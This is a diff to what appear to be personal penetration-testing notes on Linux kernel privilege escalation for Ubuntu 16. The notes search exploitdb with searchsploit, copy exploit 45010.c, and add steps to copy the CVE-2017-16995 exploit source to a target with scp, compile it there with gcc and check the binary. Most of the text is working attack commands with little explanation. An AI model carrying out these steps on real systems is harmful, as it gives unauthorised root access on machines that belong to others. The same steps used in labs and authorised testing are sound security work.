@@ -85,7 +85,7 @@ arch
 x86_64
 search for exploit
 
-put it all together...
+put it all together (kernal exploit) ...
 
 searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
 use the newest version that matches what you got... I'm assuming you can tell which one is newer using the number at the end example 45010 is newer than 42275
@@ -96,4 +96,16 @@ cp /usr/share/exploitdb/exploits/linux/local/45010.c .
 
 cat first 20 lines of it to search for instructions
 head 45010.c -n 20
+
+move it to your target if they have a compiler... let them do all the work. DO NOT FORGET THE : at the end. You will just make a copy on your own device
+scp cve-2017-16995.c user@ip:
+
+compile it using instructions, change name if needed...
+gcc cve-2017-16995.c -o cve-2017-16995
+
+use file to verify everything was made correctly
+file cve-2017-16995
+
+
+
 
